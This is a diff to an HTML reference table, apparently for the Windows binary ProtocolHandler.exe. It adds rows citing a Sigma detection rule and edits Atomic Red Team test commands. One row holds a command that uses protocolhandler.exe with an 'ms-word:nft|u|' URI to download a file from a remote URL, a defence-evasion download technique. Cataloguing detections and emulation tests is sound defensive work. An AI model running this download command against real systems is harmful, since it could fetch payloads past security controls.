@@ -445,6 +445,18 @@
   </thead>
   <tbody>
     <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_protocolhandler_suspicious_file.yml">process_creation_protocolhandler_suspicious_file.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">title</span><span class="pi">:</span> <span class="s">ProtocolHandler.exe Downloaded Suspicious File</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_protocolhandler_suspicious_file.yml">process_creation_protocolhandler_suspicious_file.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\protocolhandler.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
       <td>- Atomic Test #5: ProtocolHandler.exe Downloaded a Suspicious File [windows]</td>
@@ -471,7 +483,7 @@
     <tr>
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md">T1218.md</a></td>
-      <td>”#{microsoft_wordpath}\protocolhandler.exe” “ms-word:nft|u|#{remote_url}”</td>
+      <td>call “%microsoft_wordpath%\protocolhandler.exe” “ms-word:nft|u|#{remote_url}”</td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
     </tr>
     <tr>
@@ -483,7 +495,7 @@
     <tr>
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md">T1218.md</a></td>
-      <td>if (Test-Path “#{microsoft_wordpath}\protocolhandler.exe”) {exit 0} else {exit 1}</td>
+      <td>if (Test-Path “(Resolve-Path “C:\Program Files*\Microsoft Office\root\Office16”)\protocolhandler.exe”) {exit 0} else {exit 1}</td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
     </tr>
   </tbody>
